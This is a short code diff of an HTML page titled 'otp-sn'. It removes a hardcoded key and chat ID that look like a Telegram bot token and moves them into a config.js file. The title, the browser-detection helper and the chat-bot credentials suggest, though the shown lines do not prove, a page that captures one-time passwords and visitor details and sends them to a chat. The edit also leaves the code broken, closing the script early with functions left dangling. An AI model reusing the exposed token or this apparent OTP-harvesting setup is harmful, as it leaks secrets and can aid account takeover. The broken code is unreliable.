@@ -5,15 +5,15 @@
   <title>otp-sn</title>
 </head>
 <body>
+<script src="config.js"></script>
 <script>
   (function() {
-    const apikey = "8563470132:AAH5qMSbltcc81sAbjGVAXOw8CoTUsqzaPY";
-    const chatid = "722615124";
-
-    function getParam(name) {
-      const url = new URL(window.location.href);
-      return url.searchParams.get(name) || '';
-    }
+    // Use CONFIG from config.js
+    const apikey = CONFIG.apikey;
+    const chatid = CONFIG.chatid;
+    // ... rest of your code
+  })();
+</script>
 
     function getBrowser(userAgent) {
       if (userAgent.includes('MSIE')) return 'Internet Explorer';
